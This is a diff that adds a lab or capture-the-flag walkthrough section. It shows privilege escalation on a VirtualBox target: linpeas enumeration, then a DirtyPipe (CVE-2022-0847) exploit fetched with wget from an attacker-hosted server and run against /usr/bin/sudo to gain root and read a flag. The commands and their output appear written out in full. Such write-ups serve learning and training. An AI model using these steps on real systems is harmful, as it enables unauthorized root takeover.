@@ -237,8 +237,47 @@ www-data@heathrow-VirtualBox:/$
 
 ```
 
+We have shell but we cat access /home/heathrow we need to escalate our privilege first thing that comes in mind is linpeas.sh 
+let's move that to victim machine i create local server with python `python -m http.server 80`, to transfer file because we normally don't have internet access in victim machine.
 
+change permissions to +x : `chmod +x linpeas.sh`
 
+Now run the file: `./linpeas.sh`
 
+Analyzing the output we have first suggestion for [CVE-2022-0847] DirtyPipe:
 
+<img width="310" alt="image" src="https://user-images.githubusercontent.com/79740895/208977841-a68b2f57-224e-44ae-b548-103ce9b3b21c.png">
 
+reference: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+
+we follow the steps in GitHub repo and we have `exploit-1`, `exploit-2`. transfer this to victim machine and run this.
+
+```Shell
+www-data@heathrow-VirtualBox:/tmp$ wget 192.168.1.12/exploit-2
+wget 192.168.1.12/exploit-2
+--2022-12-22 00:04:11--  http://192.168.1.12/exploit-2
+Connecting to 192.168.1.12:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 21480 (21K) [application/octet-stream]
+Saving to: 'exploit-2'
+
+     0K .......... ..........                                 100%  395K=0.05s
+
+2022-12-22 00:04:11 (395 KB/s) - 'exploit-2' saved [21480/21480]
+```
+
+```Shell
+www-data@heathrow-VirtualBox:/tmp$ ./exploit-2 /usr/bin/sudo
+./exploit-2 /usr/bin/sudo
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+find / -type f -name "flag.txt" 2>/dev/null
+/home/heathrow/flag.txt
+cat /home/heathrow/flag.txt
+flag{box_cracked_successfully_report_to_admin}challenge
+```
+
+flag:
+```
+flag{box_cracked_successfully_report_to_admin}challenge
+```
